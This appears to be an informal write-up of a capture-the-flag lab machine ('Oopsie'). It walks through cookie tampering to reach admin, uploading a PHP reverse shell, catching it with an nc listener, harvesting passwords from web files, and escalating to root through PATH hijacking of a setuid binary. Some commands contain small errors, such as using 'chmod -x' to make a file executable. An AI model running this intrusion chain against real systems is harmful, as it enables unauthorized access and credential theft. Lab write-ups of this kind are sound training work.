Oopsie 

started with nmap -sC and -sV  

I noticed an http port and a open ssh port, there were other open ports too that where filtered but they didnt mean anything too me (look into it later maybe)

so we are going to use burp suite to see all the requests made by this website by passing each request through burp proxy 

setup the burp proxy in the browser I am using and refreshed the target website and in the target tab found a login page 

then we tried all the usual username and passwords no dice   then we saw in cookies that there was two one for role and user id   and in the query params for the account we could see they were passing the account id and we tried changing that and got the admin user id   now we edited the cookie and changed role to admin and added the admin user id also, now we are able to access another tab for file which we can  use for php reverse shell 

Now it seems there is already a php reverseshell file in parrot os in the route “/usr/share/webshells/php/php-reverse-shell.php” so we can upload a .php file since there is no validation added for the upload, so we upload it 

now we are going to bruteforce web directories to see where the uploaded file went , we will use gobuster :   gobuster dir --url http://10.129.108.104/ --wordlist /usr/share//wordlists/dirbuster/directory-list-2.3-small.txt -x php
 dir - to search for directory  -x - to check for php files   we can see there is a /upload directory but we dont have access   so we will run our port nc -lvnp 1234 

and when I access the file directly through upload like {website}/uploads/{myfilename}, in the ncat port I can see a dumb shell   now  we use python3 to get a full shell using - python3 -c 'import pty;pty.spawn("/bin/bash”)’.     
then we snoop around so folders and in the “var/www/html/cdn-cgi/login” folder we see some interesting .php file so we search using : “cat * | grep -i passw*” to get the password which is MEGACORP_4dm1n!! 

and we found a user called robert when we opened “etc/passwd”   and tried to login as robert using - “su robert” but the password was wrong so we went through another file called db.php 
and there we saw a different password M3g4C0rpUs3r! and now with that password we are able to login and then we find the user flag in the home directory : [redacted],   now we will try to escalate privilege  - we try using sudo -l but he doesnt have access, so we check using id and we see that he is part of a group called bugtracker   find / -group bugtracker 2>/dev/null now we check if there are any files we can access since that user is in that group and we use “2>/dev/null” to specify not to show permission errors   we found a file in path “/usr/bin/bugtracker”   we check what type of file and what privileges using “ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker”   we can now see a setuid in result which means we can execute this file as a root user if even if we are not a root user   dont forget “ set owner user id “ and refer if needed   now we create a file called cat in /temp to fake og cat by adding that to the file   the new cat fake file will contain /bin/sh   then we use chmod -x cat to make it executable then we addexport PATH=/tmp:$PATH so that when the bugtracker accesses cat it will access our fake cat and now when we accesses bugtracker from /temp we get root access  

  root flag - [redacted]
 



 
